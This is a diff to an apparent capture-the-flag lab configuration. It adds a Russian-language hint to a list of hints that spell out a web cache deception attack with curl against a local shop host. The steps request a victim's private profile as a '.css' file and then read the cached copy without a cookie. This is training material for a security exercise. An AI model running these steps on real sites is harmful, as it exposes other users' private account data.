@@ -20,6 +20,7 @@ lab:
   files: [task.md]
   check: "grep -q 'nto{' found.txt"
   hints:
+    - "Повторение (`web-cache-poisoning`): `curl -s -i '.../profile/me' | grep -i cache-control` — эталон `private, no-store`, затем трюк с `me.css`."
     - Приватный профиль: `curl -s -i 'http://shop.local/profile/me' -H 'Cookie: session=victim123'` (Cache-Control: private).
     - Попроси его как статику: `curl -s -i 'http://shop.local/profile/me.css' -H 'Cookie: session=victim123'` — кэш это закэширует.
     - Прочитай кэш без cookie: `curl -s 'http://shop.local/profile/me.css'`.
